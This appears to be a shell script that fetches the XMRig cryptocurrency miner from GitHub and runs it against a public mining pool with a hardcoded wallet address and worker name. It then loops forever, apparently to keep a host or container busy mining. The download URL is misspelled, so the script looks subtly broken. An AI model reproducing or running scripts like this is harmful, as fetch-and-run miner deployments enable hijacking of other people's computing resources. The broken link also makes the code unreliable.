#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/dowload/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u LTC:MDXUb5nH6Ae9v9bMcE92UPcWc6wnTrVYvy.God_Miner#ek61-6h9x -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
